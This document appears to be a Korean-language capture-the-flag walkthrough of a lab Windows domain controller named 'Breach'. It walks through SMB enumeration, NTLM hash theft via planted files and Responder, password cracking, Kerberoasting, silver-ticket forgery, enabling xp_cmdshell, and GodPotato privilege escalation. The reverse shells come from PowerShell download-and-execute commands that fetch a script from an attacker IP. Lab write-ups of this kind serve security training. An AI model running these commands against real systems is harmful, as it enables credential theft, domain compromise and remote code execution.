# Breach
- Port Scanning
- Auth as julia.wong
- Shell as svc_mssql
- Shell as authority\system

## Port Scanning
```bash
sudo nmap -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,3389,5985,9389,49664,49669,49677,49916 -sC -sV -vv -oA breach 10.129.7.91
```
<img width="1203" height="417" alt="image" src="https://github.com/user-attachments/assets/fa2e4881-c4d2-4c61-8d17-091727e82fd4" />
<img width="1203" height="240" alt="image" src="https://github.com/user-attachments/assets/cb77d0ad-53aa-45fc-8001-1a3634828a4c" />
<img width="1203" height="171" alt="image" src="https://github.com/user-attachments/assets/bfb4dab9-1919-4185-a8d2-22f23f4e1fbe" />
<img width="1203" height="170" alt="image" src="https://github.com/user-attachments/assets/8a0f7e43-f8fa-49e1-991b-e4664930b696" />

- DNS
- HTTP
- KERBEROS
- LDAP
- SMB
- MSSQL
- RDP
- WINRM

<br>

- `/etc/hosts`에 `breachdc.breach.vl` 등록.
<img width="1204" height="81" alt="image" src="https://github.com/user-attachments/assets/d0faae0c-9817-44e0-89e7-1187f037fd7d" />

## SMB
- guest login 성공.
```bash
nxc smb 10.129.7.91 -u guest -p ''
```
<img width="1203" height="129" alt="image" src="https://github.com/user-attachments/assets/f4638715-ae82-4ef4-b581-fbf92350d466" />

<br>
<br>

- `rid-brute` 옵션을 사용하여 유저 수집.
```bash
nxc smb 10.129.7.91 -u guest -p '' --rid-brute |grep -i sidtypeuser
```
<img width="1203" height="418" alt="image" src="https://github.com/user-attachments/assets/93c55866-2d56-41d5-a022-9aaf47cb61a6" />

<br>
<br>

- `/share` 폴더에 RW권한 확인.
-  `/users` 폴더에 읽기 권한 확인.
```bash
nxc smb 10.129.7.91 -u guest -p '' --shares
```
<img width="1203" height="374" alt="image" src="https://github.com/user-attachments/assets/e1fe287a-2fbf-4b5e-a948-5064a46f8eff" />

## Auth as julia.wong
- `smbclient`를 사용하여 내부 파일들을 살펴보았으나 특별한 파일을 발견하지 못함.
- `SMB`에 쓰기 권한이 있을 경우 강제인증을 유도할 수 있음.
- 특정한 파일 형식에 대해서 윈도우에서 렌더링하는 과정에 네트워크 경로를 탐색하여 NTLM 추출이 가능.
- `ntlm_theft`를 사용하여 파일 생성.
- https://github.com/Greenwolf/ntlm_theft
```bash
python3 ntlm_theft.py -g all -f test -s 10.10.15.115
```
<img width="1203" height="631" alt="image" src="https://github.com/user-attachments/assets/05dad27f-31e9-4178-84ce-fe73724c0301" />

<br>
<br>

- `responder`를 사용하여 인증 대기.
```bash
sudo responder -I tun0 -v
```
<img width="1203" height="227" alt="image" src="https://github.com/user-attachments/assets/837fe560-6527-4061-b243-d6e395e31cb4" />

<br>
<br>

- `smbclient`를 사용하여 `/share` 폴더에 접속.
```bash
smbclient -U guest //10.129.7.91/share
```
<img width="1203" height="297" alt="image" src="https://github.com/user-attachments/assets/13c328c0-f3bf-414c-a365-aea0540fe92d" />

<br>
<br>

- 각각의 폴더에 `ntlm_theft`를 사용하여 만든 파일들을 업로드.
- `responder`에서 해시 획득.
```
smb: \> prompt off

smb: \> mput *
```
<img width="1203" height="227" alt="image" src="https://github.com/user-attachments/assets/469a139a-f573-4dc2-8287-55cf53835607" />

<br>
<br>

- `john`을 사용하여 해시 크래킹.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1203" height="247" alt="image" src="https://github.com/user-attachments/assets/0a13d5fa-f109-4128-8355-e8128fb85f9c" />

<br>
<br>

- `julia.wong:Computer1` 로그인 성공.
<img width="1203" height="134" alt="image" src="https://github.com/user-attachments/assets/8696c8d4-037c-44bf-aa52-f27e9e656871" />

## Shell as svc_mssql
- `julia.wong`으로는 원격 접속이 불가능.
- `kerberoasting`을 시도하여 `svc_mssql`의 해시 획득.
```bash
impacket-GetUserSPNs -request -dc-ip 10.129.7.91 breach.vl/julia.wong
```
<img width="1203" height="494" alt="image" src="https://github.com/user-attachments/assets/f2da33e1-545e-4024-a994-9a72fbf82c9f" />

<br>
<br>

- `john`을 사용하여 크래킹.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1203" height="246" alt="image" src="https://github.com/user-attachments/assets/4da9c09f-0d79-49da-88a8-0a13dc8a8a26" />

<br>
<br>

- `svc_mssql:Trustno1` 로그인 성공.
```bash
nxc smb 10.129.7.91 -u svc_mssql -p Trustno1
```
<img width="1203" height="129" alt="image" src="https://github.com/user-attachments/assets/93b457ac-1a33-40b3-8da9-734dc403c34a" />

<br>
<br>

- `mssql`로 접속하여 확인해보았으나 특별한 정보를 발견하지 못함.
- `svc_mssql`의 비밀번호를 가지고 있어 티켓의 PAC를 위조하여 `Administrator`권한으로 서비스를 이용하는 `silver ticket`공격을 시도해볼만하다 판단.
- `svc_mssql`의 계정으로 `mssql` 접속.
```bash
impacket-mssqlclient breach.vl/svc_mssql:Trustno1@10.129.7.91 -windows-auth
```
<img width="1203" height="295" alt="image" src="https://github.com/user-attachments/assets/38147e48-8ba5-4f48-81d1-66890b1a3897" />

<br>
<br>

- 바이너리 형식의 `SID` 획득.
```
SQL (BREACH\svc_mssql  guest@master)> select SUSER_SID('breach\svc_mssql');
```
<img width="1203" height="101" alt="image" src="https://github.com/user-attachments/assets/7a3b6685-ce61-496c-ab63-9ed085c9e428" />

<br>
<br>

- `impacket`의 모듈을 사용하여 디코딩.
```python3
from impacket.dcerpc.v5.dtypes import SID

SID(bytes.fromhex('010500000000000515000000b98ceb8ab01277c5f09b182a5b040000')).formatCanonical();
```
<img width="1204" height="165" alt="image" src="https://github.com/user-attachments/assets/4d4a1381-f58b-44ba-aad0-3e9ab0b8b02e" />

<br>
<br>

- `svc_mssql`의 비밀번호 해시화.
```bash
echo -n Trustno1 | iconv -t utf-16le | openssl md4 -provider legacy
```
<img width="1204" height="87" alt="image" src="https://github.com/user-attachments/assets/9af7d745-3e9e-4c58-8905-71ac29e2e617" />

<br>
<br>

- `ticketer`를 사용하여 위조된 티켓 발급.
```bash
impacket-ticketer -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn MSSQLsvc/breachdc.breach.vl:1433 Administrator
```
<img width="1204" height="417" alt="image" src="https://github.com/user-attachments/assets/19071890-ae12-4671-951e-a282c5855b56" />

<br>
<br>

- 티켓을 가지고 `mssql` 접속.
```bash
KRB5CCNAME=./Administrator.ccache impacket-mssqlclient -no-pass -k breachdc.breach.vl
```
<img width="1204" height="296" alt="image" src="https://github.com/user-attachments/assets/b005d25b-7ff8-48c7-8e3b-1d19e4f95f5f" />

<br>
<br>

- `xp_cmdshell`을 활성화하여 명령어 실행 성공.
```
SQL (BREACH\Administrator  dbo@master)> EXECUTE sp_configure 'show advanced options', 1

SQL (BREACH\Administrator  dbo@master)> RECONFIGURE

SQL (BREACH\Administrator  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1

SQL (BREACH\Administrator  dbo@master)> RECONFIGURE

SQL (BREACH\Administrator  dbo@master)> execute xp_cmdshell 'whoami'
```
<img width="1204" height="314" alt="image" src="https://github.com/user-attachments/assets/8ae0e16f-c25e-4eb2-a060-e46677ef1e8c" />

<br>
<br>

- `Invoke-PowerShellTcp.ps1`을 사용하여 리버스 셸 획득.
```
SQL (BREACH\Administrator  dbo@master)> execute xp_cmdshell "powershell iex(new-object net.webclient).downloadstring('http://10.10.15.115/ex.ps1')"
```
<img width="1204" height="227" alt="image" src="https://github.com/user-attachments/assets/4d7f3270-a797-4db5-8a11-db3a691e5971" />

## Shell as authority\system
- `SeImpersonatePrivilege` 권한 발견.
```powershell
whoami /all
```
<img width="1204" height="324" alt="image" src="https://github.com/user-attachments/assets/8dca2000-59fd-4ec0-a6fd-dfc8c905c0fa" />

<br>
<br>

- `GodPotato`를 로컬로부터 다운로드 받아서 명령어 실행하여 성공.
- https://github.com/BeichenDream/GodPotato
```powershell
.\god.exe -cmd "cmd /c whoami"
```
<img width="1204" height="222" alt="image" src="https://github.com/user-attachments/assets/6f1253df-b77d-4a88-b4b4-08a1878308f7" />

<br>
<br>

- `Invoke-PowerShellTcp.ps1`을 사용하여 리버스 셸 획득.
```powershell
.\god.exe -cmd "cmd /c powershell iex(new-object net.webclient).downloadstring('http://10.10.15.115/ex.ps1')"
```
<img width="1204" height="222" alt="image" src="https://github.com/user-attachments/assets/a667970a-c3fb-41ad-9974-6e000e708454" />
